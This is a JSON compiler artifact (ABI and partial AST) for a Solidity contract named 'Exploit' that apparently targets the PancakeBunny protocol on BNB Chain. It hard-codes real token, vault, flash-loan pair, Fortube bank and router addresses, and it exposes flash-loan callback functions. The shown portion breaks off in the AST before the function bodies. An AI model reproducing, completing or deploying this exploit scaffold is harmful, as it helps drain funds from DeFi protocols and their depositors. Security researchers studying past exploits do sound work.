{
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "token",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "fee",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "params",
          "type": "bytes"
        }
      ],
      "name": "executeOperation",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "main",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_sender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_amount0Out",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "_amount1Out",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "_data",
          "type": "bytes"
        }
      ],
      "name": "pancakeCall",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "start",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "allSourcePaths": {
    "0": "contracts/exploit.sol",
    "1": "contracts/interfaces.sol"
  },
  "ast": {
    "absolutePath": "contracts/exploit.sol",
    "exportedSymbols": {
      "Exploit": [
        587
      ],
      "IERC20": [
        629
      ],
      "IFortubeBank": [
        1379
      ],
      "IPancakeERC20": [
        985
      ],
      "IPancakePair": [
        869
      ],
      "IPancakeRouter01": [
        1291
      ],
      "IVaultFlipToFlip": [
        1353
      ],
      "IZap": [
        1313
      ]
    },
    "id": 588,
    "license": "MIT",
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1,
        "literals": [
          "solidity",
          "^",
          "0.8",
          ".0"
        ],
        "nodeType": "PragmaDirective",
        "src": "32:23:0"
      },
      {
        "absolutePath": "contracts/interfaces.sol",
        "file": "./interfaces.sol",
        "id": 2,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 588,
        "sourceUnit": 1380,
        "src": "57:26:0",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [],
        "canonicalName": "Exploit",
        "contractDependencies": [],
        "contractKind": "contract",
        "fullyImplemented": true,
        "id": 587,
        "linearizedBaseContracts": [
          587
        ],
        "name": "Exploit",
        "nameLocation": "94:7:0",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "id": 4,
            "mutability": "mutable",
            "name": "owner",
            "nameLocation": "116:5:0",
            "nodeType": "VariableDeclaration",
            "scope": 587,
            "src": "108:13:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 3,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "108:7:0",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 6,
            "mutability": "mutable",
            "name": "step",
            "nameLocation": "132:4:0",
            "nodeType": "VariableDeclaration",
            "scope": 587,
            "src": "127:9:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 5,
              "name": "uint",
              "nodeType": "ElementaryTypeName",
              "src": "127:4:0",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 12,
            "mutability": "mutable",
            "name": "WBNB",
            "nameLocation": "150:4:0",
            "nodeType": "VariableDeclaration",
            "scope": 587,
            "src": "143:64:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IERC20_$629",
              "typeString": "contract IERC20"
            },
            "typeName": {
              "id": 8,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 7,
                "name": "IERC20",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 629,
                "src": "143:6:0"
              },
              "referencedDeclaration": 629,
              "src": "143:6:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IERC20_$629",
                "typeString": "contract IERC20"
              }
            },
            "value": {
              "arguments": [
                {
                  "hexValue": "307862623443644239434264333642303162443163426145424632446530386439313733626330393563",
                  "id": 10,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "164:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"
                }
              ],
              "expression": {
                "argumentTypes": [
                  {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  }
                ],
                "id": 9,
                "name": "IERC20",
                "nodeType": "Identifier",
                "overloadedDeclarations": [],
                "referencedDeclaration": 629,
                "src": "157:6:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_type$_t_contract$_IERC20_$629_$",
                  "typeString": "type(contract IERC20)"
                }
              },
              "id": 11,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "typeConversion",
              "lValueRequested": false,
              "names": [],
              "nodeType": "FunctionCall",
              "src": "157:50:0",
              "tryCall": false,
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IERC20_$629",
                "typeString": "contract IERC20"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 18,
            "mutability": "mutable",
            "name": "BSC_USD",
            "nameLocation": "220:7:0",
            "nodeType": "VariableDeclaration",
            "scope": 587,
            "src": "213:67:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IERC20_$629",
              "typeString": "contract IERC20"
            },
            "typeName": {
              "id": 14,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 13,
                "name": "IERC20",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 629,
                "src": "213:6:0"
              },
              "referencedDeclaration": 629,
              "src": "213:6:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IERC20_$629",
                "typeString": "contract IERC20"
              }
            },
            "value": {
              "arguments": [
                {
                  "hexValue": "307835356433393833323666393930353966463737353438353234363939393032374233313937393535",
                  "id": 16,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "237:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0x55d398326f99059fF775485246999027B3197955"
                }
              ],
              "expression": {
                "argumentTypes": [
                  {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  }
                ],
                "id": 15,
                "name": "IERC20",
                "nodeType": "Identifier",
                "overloadedDeclarations": [],
                "referencedDeclaration": 629,
                "src": "230:6:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_type$_t_contract$_IERC20_$629_$",
                  "typeString": "type(contract IERC20)"
                }
              },
              "id": 17,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "typeConversion",
              "lValueRequested": false,
              "names": [],
              "nodeType": "FunctionCall",
              "src": "230:50:0",
              "tryCall": false,
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IERC20_$629",
                "typeString": "contract IERC20"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 24,
            "mutability": "mutable",
            "name": "BUNNY",
            "nameLocation": "293:5:0",
            "nodeType": "VariableDeclaration",
            "scope": 587,
            "src": "286:65:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IERC20_$629",
              "typeString": "contract IERC20"
            },
            "typeName": {
              "id": 20,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 19,
                "name": "IERC20",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 629,
                "src": "286:6:0"
              },
              "referencedDeclaration": 629,
              "src": "286:6:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IERC20_$629",
                "typeString": "contract IERC20"
              }
            },
            "value": {
              "arguments": [
                {
                  "hexValue": "307843393834394536666442373433643038664165453345333464643244316263363945413131613531",
                  "id": 22,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "308:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0xC9849E6fdB743d08fAeE3E34dd2D1bc69EA11a51"
                }
              ],
              "expression": {
                "argumentTypes": [
                  {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  }
                ],
                "id": 21,
                "name": "IERC20",
                "nodeType": "Identifier",
                "overloadedDeclarations": [],
                "referencedDeclaration": 629,
                "src": "301:6:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_type$_t_contract$_IERC20_$629_$",
                  "typeString": "type(contract IERC20)"
                }
              },
              "id": 23,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "typeConversion",
              "lValueRequested": false,
              "names": [],
              "nodeType": "FunctionCall",
              "src": "301:50:0",
              "tryCall": false,
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IERC20_$629",
                "typeString": "contract IERC20"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 30,
            "mutability": "mutable",
            "name": "ZapBSC",
            "nameLocation": "368:6:0",
            "nodeType": "VariableDeclaration",
            "scope": 587,
            "src": "363:62:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IZap_$1313",
              "typeString": "contract IZap"
            },
            "typeName": {
              "id": 26,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 25,
                "name": "IZap",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 1313,
                "src": "363:4:0"
              },
              "referencedDeclaration": 1313,
              "src": "363:4:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IZap_$1313",
                "typeString": "contract IZap"
              }
            },
            "value": {
              "arguments": [
                {
                  "hexValue": "307864433262424230443333453065374465613946356239384634364544426143383233353836613043",
                  "id": 28,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "382:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0xdC2bBB0D33E0e7Dea9F5b98F46EDBaC823586a0C"
                }
              ],
              "expression": {
                "argumentTypes": [
                  {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  }
                ],
                "id": 27,
                "name": "IZap",
                "nodeType": "Identifier",
                "overloadedDeclarations": [],
                "referencedDeclaration": 1313,
                "src": "377:4:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_type$_t_contract$_IZap_$1313_$",
                  "typeString": "type(contract IZap)"
                }
              },
              "id": 29,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "typeConversion",
              "lValueRequested": false,
              "names": [],
              "nodeType": "FunctionCall",
              "src": "377:48:0",
              "tryCall": false,
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IZap_$1313",
                "typeString": "contract IZap"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 36,
            "mutability": "mutable",
            "name": "Pair_PancakeLps",
            "nameLocation": "445:15:0",
            "nodeType": "VariableDeclaration",
            "scope": 587,
            "src": "431:89:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IPancakeERC20_$985",
              "typeString": "contract IPancakeERC20"
            },
            "typeName": {
              "id": 32,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 31,
                "name": "IPancakeERC20",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 985,
                "src": "431:13:0"
              },
              "referencedDeclaration": 985,
              "src": "431:13:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IPancakeERC20_$985",
                "typeString": "contract IPancakeERC20"
              }
            },
            "value": {
              "arguments": [
                {
                  "hexValue": "307831366239613832383931333338663962413830453244363937304664644137394431656230646145",
                  "id": 34,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "477:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE"
                }
              ],
              "expression": {
                "argumentTypes": [
                  {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  }
                ],
                "id": 33,
                "name": "IPancakeERC20",
                "nodeType": "Identifier",
                "overloadedDeclarations": [],
                "referencedDeclaration": 985,
                "src": "463:13:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_type$_t_contract$_IPancakeERC20_$985_$",
                  "typeString": "type(contract IPancakeERC20)"
                }
              },
              "id": 35,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "typeConversion",
              "lValueRequested": false,
              "names": [],
              "nodeType": "FunctionCall",
              "src": "463:57:0",
              "tryCall": false,
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IPancakeERC20_$985",
                "typeString": "contract IPancakeERC20"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 42,
            "mutability": "mutable",
            "name": "PancakeBunny_FLIP_USDT_BNB",
            "nameLocation": "543:26:0",
            "nodeType": "VariableDeclaration",
            "scope": 587,
            "src": "526:106:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IVaultFlipToFlip_$1353",
              "typeString": "contract IVaultFlipToFlip"
            },
            "typeName": {
              "id": 38,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 37,
                "name": "IVaultFlipToFlip",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 1353,
                "src": "526:16:0"
              },
              "referencedDeclaration": 1353,
              "src": "526:16:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IVaultFlipToFlip_$1353",
                "typeString": "contract IVaultFlipToFlip"
              }
            },
            "value": {
              "arguments": [
                {
                  "hexValue": "307836333365353338456346306265653161313863324544464531304334446130643645373165373742",
                  "id": 40,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "589:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0x633e538EcF0bee1a18c2EDFE10C4Da0d6E71e77B"
                }
              ],
              "expression": {
                "argumentTypes": [
                  {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  }
                ],
                "id": 39,
                "name": "IVaultFlipToFlip",
                "nodeType": "Identifier",
                "overloadedDeclarations": [],
                "referencedDeclaration": 1353,
                "src": "572:16:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_type$_t_contract$_IVaultFlipToFlip_$1353_$",
                  "typeString": "type(contract IVaultFlipToFlip)"
                }
              },
              "id": 41,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "typeConversion",
              "lValueRequested": false,
              "names": [],
              "nodeType": "FunctionCall",
              "src": "572:60:0",
              "tryCall": false,
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IVaultFlipToFlip_$1353",
                "typeString": "contract IVaultFlipToFlip"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 54,
            "mutability": "mutable",
            "name": "flashloanPairs",
            "nameLocation": "650:14:0",
            "nodeType": "VariableDeclaration",
            "scope": 587,
            "src": "639:594:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_array$_t_address_$7_storage",
              "typeString": "address[7]"
            },
            "typeName": {
              "baseType": {
                "id": 43,
                "name": "address",
                "nodeType": "ElementaryTypeName",
                "src": "639:7:0",
                "stateMutability": "nonpayable",
                "typeDescriptions": {
                  "typeIdentifier": "t_address",
                  "typeString": "address"
                }
              },
              "id": 45,
              "length": {
                "hexValue": "37",
                "id": 44,
                "isConstant": false,
                "isLValue": false,
                "isPure": true,
                "kind": "number",
                "lValueRequested": false,
                "nodeType": "Literal",
                "src": "647:1:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_rational_7_by_1",
                  "typeString": "int_const 7"
                },
                "value": "7"
              },
              "nodeType": "ArrayTypeName",
              "src": "639:10:0",
              "typeDescriptions": {
                "typeIdentifier": "t_array$_t_address_$7_storage_ptr",
                "typeString": "address[7]"
              }
            },
            "value": {
              "components": [
                {
                  "hexValue": "307830654437653532393434313631343530343737656534313744453943643361383539623134664430",
                  "id": 46,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "677:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0x0eD7e52944161450477ee417DE9Cd3a859b14fD0"
                },
                {
                  "hexValue": "307835384638373638353761303244363736324530313031626235433436413863314544343444633136",
                  "id": 47,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "758:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16"
                },
                {
                  "hexValue": "307837344534373136453433316634353830374443463139663238346337614139394631386134666263",
                  "id": 48,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "838:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0x74E4716E431f45807DCF19f284c7aA99F18a4fbc"
                },
                {
                  "hexValue": "307836314542373839643735413935434161336646353065643745343762393663313332664563303832",
                  "id": 49,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "918:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0x61EB789d75A95CAa3fF50ed7E47b96c132fEc082"
                },
                {
                  "hexValue": "307839616463364662373843454641303745313345393239344631353043314538433144643536366330",
                  "id": 50,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "998:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0x9adc6Fb78CEFA07E13E9294F150C1E8C1Dd566c0"
                },
                {
                  "hexValue": "307846334263364643303830666643433330643933644634384246413261413134623836393535346262",
                  "id": 51,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "1078:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0xF3Bc6FC080ffCC30d93dF48BFA2aA14b869554bb"
                },
                {
                  "hexValue": "307844643562416438663862333630643736643132466441323330463842414634326665303032324346",
                  "id": 52,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "1157:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0xDd5bAd8f8b360d76d12FdA230F8BAF42fe0022CF"
                }
              ],
              "id": 53,
              "isConstant": false,
              "isInlineArray": true,
              "isLValue": false,
              "isPure": true,
              "lValueRequested": false,
              "nodeType": "TupleExpression",
              "src": "667:566:0",
              "typeDescriptions": {
                "typeIdentifier": "t_array$_t_address_$7_memory_ptr",
                "typeString": "address[7] memory"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 60,
            "mutability": "mutable",
            "name": "FortubeBank",
            "nameLocation": "1253:11:0",
            "nodeType": "VariableDeclaration",
            "scope": 587,
            "src": "1240:83:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IFortubeBank_$1379",
              "typeString": "contract IFortubeBank"
            },
            "typeName": {
              "id": 56,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 55,
                "name": "IFortubeBank",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 1379,
                "src": "1240:12:0"
              },
              "referencedDeclaration": 1379,
              "src": "1240:12:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IFortubeBank_$1379",
                "typeString": "contract IFortubeBank"
              }
            },
            "value": {
              "arguments": [
                {
                  "hexValue": "307830634541303833326539636442623544343736303430443538456130376563666265424237363732",
                  "id": 58,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "1280:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672"
                }
              ],
              "expression": {
                "argumentTypes": [
                  {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  }
                ],
                "id": 57,
                "name": "IFortubeBank",
                "nodeType": "Identifier",
                "overloadedDeclarations": [],
                "referencedDeclaration": 1379,
                "src": "1267:12:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_type$_t_contract$_IFortubeBank_$1379_$",
                  "typeString": "type(contract IFortubeBank)"
                }
              },
              "id": 59,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "typeConversion",
              "lValueRequested": false,
              "names": [],
              "nodeType": "FunctionCall",
              "src": "1267:56:0",
              "tryCall": false,
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IFortubeBank_$1379",
                "typeString": "contract IFortubeBank"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 66,
            "mutability": "mutable",
            "name": "PancakeBunny_FLIP_USDT_BNB_v1",
            "nameLocation": "1370:29:0",
            "nodeType": "VariableDeclaration",
            "scope": 587,
            "src": "1357:101:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IPancakePair_$869",
              "typeString": "contract IPancakePair"
            },
            "typeName": {
              "id": 62,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 61,
                "name": "IPancakePair",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 869,
                "src": "1357:12:0"
              },
              "referencedDeclaration": 869,
              "src": "1357:12:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IPancakePair_$869",
                "typeString": "contract IPancakePair"
              }
            },
            "value": {
              "arguments": [
                {
                  "hexValue": "307832306243433362386130303931644461633264304243333046363845364342623937646535394364",
                  "id": 64,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "1415:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0x20bCC3b8a0091dDac2d0BC30F68E6CBb97de59Cd"
                }
              ],
              "expression": {
                "argumentTypes": [
                  {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  }
                ],
                "id": 63,
                "name": "IPancakePair",
                "nodeType": "Identifier",
                "overloadedDeclarations": [],
                "referencedDeclaration": 869,
                "src": "1402:12:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_type$_t_contract$_IPancakePair_$869_$",
                  "typeString": "type(contract IPancakePair)"
                }
              },
              "id": 65,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "typeConversion",
              "lValueRequested": false,
              "names": [],
              "nodeType": "FunctionCall",
              "src": "1402:56:0",
              "tryCall": false,
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IPancakePair_$869",
                "typeString": "contract IPancakePair"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 72,
            "mutability": "mutable",
            "name": "WBNB_BUNNY",
            "nameLocation": "1477:10:0",
            "nodeType": "VariableDeclaration",
            "scope": 587,
            "src": "1464:82:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IPancakePair_$869",
              "typeString": "contract IPancakePair"
            },
            "typeName": {
              "id": 68,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 67,
                "name": "IPancakePair",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 869,
                "src": "1464:12:0"
              },
              "referencedDeclaration": 869,
              "src": "1464:12:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IPancakePair_$869",
                "typeString": "contract IPancakePair"
              }
            },
            "value": {
              "arguments": [
                {
                  "hexValue": "307837426238393436303539394462663332656533416135303739384242634561653241354637663661",
                  "id": 70,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "number",
                  "lValueRequested": false,
                  "nodeType": "Literal",
                  "src": "1503:42:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "value": "0x7Bb89460599Dbf32ee3Aa50798BBcEae2A5F7f6a"
                }
              ],
              "expression": {
                "argumentTypes": [
                  {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  }
                ],
                "id": 69,
                "name": "IPancakePair",
                "nodeType": "Identifier",
                "overloadedDeclarations": [],
                "referencedDeclaration": 869,
                "src": "1490:12:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_type$_t_contract$_IPancakePair_$869_$",
                  "typeString": "type(contract IPancakePair)"
                }
              },
              "id": 71,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "typeConversion",
              "lValueRequested": false,
              "names": [],
              "nodeType": "FunctionCall",
              "src": "1490:56:0",
              "tryCall": false,
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IPancakePair_$869",
                "typeString": "contract IPancakePair"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 81,
            "mutability": "mutable",
            "name": "router",
            "nameLocation": "1569:6:0",
            "nodeType": "VariableDeclaration",
            "scope": 587,
            "src": "1552:95:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IPancakeRouter01_$1291",
              "typeString": "contract IPancakeRouter01"
            },
            "typeName": {
              "id": 74,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 73,
                "name": "IPancakeRouter01",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 1291,
                "src": "1552:16:0"
              },
              "referencedDeclaration": 1291,
              "src": "1552:16:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IPancakeRouter01_$1291",
                "typeString": "contract IPancakeRouter01"
              }
            },
            "value": {
              "arguments": [
                {
                  "arguments": [
                    {
                      "hexValue": "307830356646324230444236393435384130373530626164656263346639653133614464363038433746",
                      "id": 78,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "1603:42:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "value": "0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F"
                    }
                  ],
                  "expression": {
                    "argumentTypes": [
                      {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    ],
                    "id": 77,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": true,
                    "lValueRequested": false,
                    "nodeType": "ElementaryTypeNameExpression",
                    "src": "1595:8:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_type$_t_address_payable_$",
                      "typeString": "type(address payable)"
                    },
                    "typeName": {
                      "id": 76,
                      "name": "address",
                      "nodeType": "ElementaryTypeName",
                      "src": "1595:8:0",
                      "stateMutability": "payable",
                      "typeDescriptions": {}
                    }
                  },
                  "id": 79,
                  "isConstant": false,
                  "isLValue": false,
                  "isPure": true,
                  "kind": "typeConversion",
                  "lValueRequested": false,
                  "names": [],
                  "nodeType": "FunctionCall",
                  "src": "1595:51:0",
                  "tryCall": false,
                  "typeDescriptions": {
                    "typeIdentifier": "t_address_payable",
                    "typeString": "address payable"
                  }
                }
              ],
              "expression": {
                "argumentTypes": [
                  {
                    "typeIdentifier": "t_address_payable",
                    "typeString": "address payable"
                  }
                ],
                "id": 75,
                "name": "IPancakeRouter01",
                "nodeType": "Identifier",
                "overloadedDeclarations": [],
                "referencedDeclaration": 1291,
                "src": "1578:16:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1291_$",
                  "typeString": "type(contract IPancakeRouter01)"
                }
              },
              "id": 80,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "typeConversion",
              "lValueRequested": false,
              "names": [],
              "nodeType": "FunctionCall",
              "src": "1578:69:0",
              "tryCall": false,
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IPancakeRouter01_$1291",
                "typeString": "contract IPancakeRouter01"
              }
            },
            "visibility": "internal"
          },
          {
            "body": {
              "id": 89,
              "nodeType": "Block",
              "src": "1679:35:0",
              "statements": [
                {
                  "expression": {
                    "id": 87,
                    "isConstant": false,
                    "isLValue": false,
